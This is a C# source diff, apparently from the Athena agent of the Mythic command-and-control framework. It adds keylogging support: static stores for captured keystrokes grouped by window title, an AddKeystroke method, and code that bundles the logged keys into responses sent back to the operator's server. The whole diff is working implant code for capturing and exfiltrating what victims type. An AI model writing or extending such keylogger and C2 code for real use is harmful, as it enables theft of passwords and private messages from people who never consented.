@@ -1,6 +1,7 @@
 ﻿using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Runtime.CompilerServices;
+using System.Text;
 using Athena.Models;
 using Athena.Models.Mythic.Tasks;
 using Athena.Models.Responses;
@@ -13,6 +14,15 @@ namespace Athena.Commands
         private static ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
         private static ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
         public static ConcurrentDictionary<string, MythicJob> activeJobs = new ConcurrentDictionary<string, MythicJob>();
+
+        public static string klTask = String.Empty;
+        public static Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();
+
+
+
+
+        public static ConcurrentDictionary<string, StringBuilder> _keylogOutput = new ConcurrentDictionary<string, StringBuilder>();
+        public static ConcurrentDictionary<string, Dictionary<string,Keylogs>> keyloggerOutput = new ConcurrentDictionary<string, Dictionary<string,Keylogs>>();
         public static void AddResponse(string res)
         {
             responseStrings.Add(res);
@@ -190,7 +200,38 @@ namespace Athena.Commands
                     results.Add(res);
                 }
             }
+
+            if (!String.IsNullOrEmpty(klTask) && klLogs.Count > 0)
+            {
+                KeystrokesResponseResult krr = new KeystrokesResponseResult();
+                krr.task_id = klTask;
+                krr.keylogs = klLogs.Values.ToList();
+                krr.Prepare();
+
+                results.Add(krr.ToJson());
+                klLogs.Clear();
+            }
             return results;
         }
+        public static void AddKeystroke(string window_title, string task_id, string key)
+        {
+            if (String.IsNullOrEmpty(klTask))
+            {
+                klTask = task_id;
+            }
+
+            if (!klLogs.ContainsKey(window_title))
+            {
+                klLogs.Add(window_title, new Keylogs()
+                {
+                    window_title = window_title,
+                    user = String.Empty,
+                    builder = new StringBuilder()
+                });
+            }
+
+            klLogs[window_title].builder.Append(key);
+        }
+
     }
 }
